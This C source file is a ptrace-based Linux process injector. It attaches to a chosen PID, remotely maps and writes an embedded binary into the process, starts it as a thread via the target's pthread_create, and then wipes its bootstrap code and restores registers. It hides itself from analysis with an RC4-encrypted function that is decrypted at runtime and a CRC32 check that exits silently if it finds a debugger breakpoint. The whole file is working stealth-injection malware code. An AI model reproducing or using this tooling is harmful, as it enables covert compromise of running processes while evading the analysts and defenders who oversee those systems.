#include "maps_parsing.h"
#include "ptrace_funcs.h"
#include "load_binary.h"
#include "../../common/crypto/crc32.h"
#include "../../common/crypto/rc4.h"

#include <elf.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <stdlib.h>
#include <sys/stat.h>
#include <sys/mman.h>
#include <linux/limits.h>

// to be loaded into target
extern void* mmap_space_size;
extern void* start_thread_size;

// in trouble
extern void* launch_thread_size;
extern void* valid_target_size;

// crc result
uint32_t launch_thread_crc __attribute((section(".compute_crc_launch_thread"))) = 0;

// rc4 key
unsigned char valid_target_key[128] __attribute((section(".rc4_valid_target"))) = { 0 };

static uint64_t resolve_symbol(const char* p_name, const char* p_memory)
{
    if (p_memory[0] != 0x7f || p_memory[1] != 'E' || p_memory[2] != 'L' || p_memory[3] != 'F')
    {
        return 0;
    }

    unsigned int strsize = 0;
    const char* strtab = NULL;
    const Elf64_Sym* symtab = NULL;
    const Elf64_Ehdr* ehdr = (Elf64_Ehdr *)p_memory;
    const Elf64_Phdr* phdr = (Elf64_Phdr *)&p_memory[ehdr->e_phoff];
    int ph_entries = ehdr->e_phnum;

    for (int i = 0; i < ph_entries; i++, phdr++)
    {
        if (phdr->p_type == PT_DYNAMIC)
        {
            for (const Elf64_Dyn* dyn = (Elf64_Dyn*)&p_memory[phdr->p_offset]; dyn->d_tag != DT_NULL; ++dyn)
            {
                switch (dyn->d_tag)
                {
                    case DT_STRTAB:
                        strtab = &p_memory[dyn->d_un.d_ptr];
                        break;
                    case DT_SYMTAB:
                        symtab = (Elf64_Sym*)&p_memory[dyn->d_un.d_ptr];
                        break;
                    case DT_STRSZ:
                        strsize = dyn->d_un.d_val;
                        break;
                    default:
                        break;
                }
            }
        }
    }

    if (strtab == NULL || symtab == NULL || strsize == 0)
    {
        return 0;
    }

    // skip the empty first entry
    symtab++;
    for ( ; symtab->st_name < strsize; symtab++)
    {
        if (strcmp(&strtab[symtab->st_name], p_name) == 0)
        {
            return symtab->st_value;
        }

        if (symtab->st_info == 0 && symtab->st_name == 0 && symtab->st_other == 0 &&
            symtab->st_shndx == 0 && symtab->st_size == 0 && symtab->st_value == 0)
        {
            return 0;
        }
    }

    return 0;
}

static uint64_t get_lib_sym_addr(const char* p_path, const char* p_symbol)
{
    int fd = open(p_path, O_RDONLY);
    if (fd < 0)
    {
        return 0;
    }

    struct stat st = { 0 };
    if (fstat(fd, &st) < 0)
    {
        close(fd);
        return 0;
    }

    const char* lib_mem = mmap(NULL, st.st_size, PROT_READ, MAP_PRIVATE, fd, 0);
    if (lib_mem == MAP_FAILED)
    {
        close(fd);
        return 0;
    }

    uint64_t symaddr = resolve_symbol(p_symbol, lib_mem);
    if (symaddr == 0)
    {
        munmap((void*)lib_mem, st.st_size);
        close(fd);
        return 0;
    }

    munmap((void*)lib_mem, st.st_size);
    close(fd);

    return symaddr;
}

bool __attribute__((section(".valid_target"))) is_valid_target(int p_pid, uint64_t* p_create_thread_addr)
{
    char libpthread_path[PATH_MAX] = { 0 };
    uint64_t libpthread_base = find_lib_base(p_pid, "libpthread-", libpthread_path);
    if (libpthread_path[0] == 0 || libpthread_base == 0)
    {
        return false;
    }

    uint64_t create_thread_offset = get_lib_sym_addr(libpthread_path, "pthread_create");
    if (create_thread_offset == 0)
    {
        return false;
    }

    *p_create_thread_addr = libpthread_base + create_thread_offset;
    return true;
}

static uint64_t inject_binary(int p_pid, uint64_t p_bootstrap_addr)
{
    uint64_t mapped = 0;
    if (!remote_execute(p_pid, p_bootstrap_addr, (char*)&mmap_space,
        (uint64_t)&mmap_space_size, NULL, 0, &mapped))
    {
        return 0;
    }

    if (mapped <= 0)
    {
        return 0;
    }

    if (!write_binary(p_pid, (const char*)mapped))
    {
        return 0;
    }

    return mapped;
}

bool __attribute__((section(".launch_thread"))) launch_thread(int p_pid,
    uint64_t loaded_base, uint64_t p_bootstrap_addr, uint64_t p_create_thread_addr)
{
    uint64_t thread_start_offset = get_thread_start();
    if (thread_start_offset == 0)
    {
        return false;
    }

    uint64_t retval = 0;
    char* argv[2] = { (char*)p_create_thread_addr, (char*)(loaded_base + thread_start_offset) };
    if (!remote_execute(p_pid, p_bootstrap_addr, (char*)&start_thread,
        (uint64_t)&start_thread_size, argv, 2, &retval))
    {
        return false;
    }

    return true;
}

int main(int p_argc, char** p_argv)
{
    if (p_argc != 2)
    {
        return EXIT_FAILURE;
    }

    int pid = atoi(p_argv[1]);

    // decrypt valid target
    struct rc4_state state = {};
    mprotect(is_valid_target, (uint64_t)&valid_target_size, PROT_READ | PROT_WRITE | PROT_EXEC);
    rc4_init(&state, valid_target_key, sizeof(valid_target_key));
    rc4_crypt(&state, (unsigned char*)is_valid_target, (unsigned char*)is_valid_target,
              (uint64_t)&valid_target_size);
    mprotect(is_valid_target, (uint64_t)&valid_target_size, PROT_READ | PROT_EXEC);

    uint64_t create_thread_addr = 0;
    if (!is_valid_target(pid, &create_thread_addr))
    {
        return EXIT_FAILURE;
    }

    uint64_t bootstrap_addr = find_free_space(pid);
    if (bootstrap_addr == 0)
    {
        return EXIT_FAILURE;
    }

    if (!attach_to_pid(pid))
    {
        return EXIT_FAILURE;
    }

    struct user_regs_struct register_state = { };
    if (!backup_registers(pid, &register_state))
    {
        detach_from_pid(pid);
        return EXIT_FAILURE;
    }

    uint64_t loaded_base = inject_binary(pid, bootstrap_addr);
    if (loaded_base == 0)
    {
        restore_registers(pid, &register_state);
        detach_from_pid(pid);
        return EXIT_FAILURE;
    }

    // check for bp in launch_thread
    if(crc32_bitwise((unsigned char*)(&launch_thread),
        (uint64_t)&launch_thread_size) != launch_thread_crc)
    {
        exit(0);
    }

    if (!launch_thread(pid, loaded_base, bootstrap_addr, create_thread_addr))
    {
        restore_registers(pid, &register_state);
        detach_from_pid(pid);
        return EXIT_FAILURE;
    }

    remote_zero_mem(pid, (char*)bootstrap_addr, 0x100);
    restore_registers(pid, &register_state);
    detach_from_pid(pid);
    return EXIT_SUCCESS;
}
